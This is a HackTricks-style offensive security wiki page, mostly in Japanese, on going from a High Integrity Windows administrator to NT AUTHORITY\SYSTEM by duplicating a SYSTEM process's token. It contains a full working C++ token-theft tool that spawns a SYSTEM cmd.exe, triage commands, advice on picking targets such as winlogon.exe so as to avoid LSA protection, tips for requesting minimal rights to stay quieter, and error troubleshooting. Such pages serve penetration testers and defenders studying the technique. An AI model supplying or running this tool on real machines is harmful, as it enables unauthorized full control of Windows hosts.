# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

このページは、**High Integrity の administrator process** から **`NT AUTHORITY\SYSTEM`** へ移行する **manual** 版について説明しています。方法は、**保護されていない SYSTEM process を開き、その token を複製し、その token で child process を起動する** というものです。

もし **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** だけを持っていて、**適切な SYSTEM process を開けない** 場合は、通常 **Potato / named-pipe** の方法のほうが信頼性が高いです:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

目的が `SYSTEM` だけではなく、**可能な限り多くの privileges を持つ SYSTEM token** であれば、こちらも確認してください:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

token を盗もうとする前に、まず context を素早く確認します:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- **High Integrity** の admin token は通常、**`SeDebugPrivilege` を有効化**して、多くの保護されていない SYSTEM プロセスを開くのに十分です。
- **`CreateProcessWithTokenW` は呼び出し元に `SeImpersonatePrivilege` を要求**します。もしこの API が `1314` で失敗するなら、すでに SYSTEM の primary token を複製した後で **`CreateProcessAsUserW`** に切り替えてください。
- 現代の Windows では、**`lsass.exe` はしばしば悪い対象**です。なぜなら **LSA protection / PPL** により、`SeDebugPrivilege` を持つ administrator でもアクセスがブロックされるからです。代わりに **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**、または SYSTEM として動作している初期の **`svchost.exe`** を優先してください。
- すべての SYSTEM プロセスが同じように有用な token を持っているわけではありません。SYSTEM を取得しても一部の privileges が欠けている場合は、この technique が壊れていると決めつけず、別の SYSTEM プロセスを試してください。

## PID を慎重に選ぶ

これを確実に動かす最も簡単な方法は、**Administrators が process を query し、その token を duplicate できる DACL を実際に許可している SYSTEM process を選ぶこと**です。

最初に試すべき良い候補:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM として動作している初期の `svchost.exe` インスタンス

デフォルトで避けるべきもの:

- **RunAsPPL / LSA protection** が有効なホスト上の `lsass.exe`
- `SeDebugPrivilege` を有効化した後でも `Access denied` を返す protected / security-sensitive process

昇格した状態で動作する **Process Explorer** または **Process Hacker** を使えば、候補の process とその token/ACL を確認できます。

### Code

以下の code は [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) からのものです。これは **引数として Process ID を指定**でき、指定した process の user として動作する CMD を実行します。\
High Integrity process で実行すると、**System として動作している process（`winlogon`、`wininit` など）の PID を指定**して、`cmd.exe` を SYSTEM として実行できます。
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

サンプルでは `MAXIMUM_ALLOWED` を使っていますが、実運用では関係する最小限の要素を覚えておくと便利です:

- `OpenProcessToken()` に必要なのは、**process handle** が **`PROCESS_QUERY_LIMITED_INFORMATION`** で開かれていることだけです。
- `CreateProcessWithTokenW()` を使うには、**primary token handle** に **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** が必要です。
- `DuplicateTokenEx()` は、impersonation token だけでなく、**primary token** (`TokenPrimary`) を作成しなければなりません。
- すでに SYSTEM を impersonate していても `CreateProcessWithTokenW()` が `1314` で失敗する場合は、代わりに `CreateProcessAsUserW()` を試してください。

つまり、**target process を `PROCESS_ALL_ACCESS` で開くのは通常不要**で、token を query するのに必要な権限だけを要求するほうがより静かです。

## Error

場合によっては、System の impersonate を試してもうまくいかず、次のような出力が表示されることがあります:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
This means that even if you are running on a High Integrity level **you don't have enough permissions** over that target process/token.\
Let's check current Administrator permissions over `svchost.exe` processes with **Process Explorer** (or you can also use **Process Hacker**):

1. Select a process of `svchost.exe`
2. Right Click --> Properties
3. Inside "Security" Tab click in the bottom right the button "Permissions"
4. Click on "Advanced"
5. Select "Administrators" and click on "Edit"
6. Click on "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

The previous image contains all the privileges that "Administrators" have over the selected process (as you can see in case of `svchost.exe` they only have "Query" privileges)

See the privileges "Administrators" have over `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Inside that process "Administrators" can "Read Memory" and "Read Permissions" which probably allows Administrators to impersonate the token used by this process.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: the process DACL blocks you, or the target is **protected/PPL**. Pick another SYSTEM process.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: your token handle was opened without enough rights, or the target token DACL prevents duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: the caller doesn't currently have **`SeImpersonatePrivilege`** enabled. Try enabling it first or use `CreateProcessAsUserW()` with the duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** after previous failures: this often just means the earlier token duplication/impersonation step failed, so there is no usable primary token to launch the child process.

## Operator notes

- This technique is great when you are already **local admin + high integrity** and just want a quick, manual path to SYSTEM without spinning up a service or a named-pipe coercion chain.
- On hardened Windows 11 / Server environments, **LSA protection is increasingly common**, so a workflow that assumes `lsass.exe` is always readable is brittle. **`winlogon.exe` / `wininit.exe` / `services.exe` are usually better first picks**.
- If you land in a **service account** context instead of an elevated admin desktop, the **Potato family** is usually a better fit than this page.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
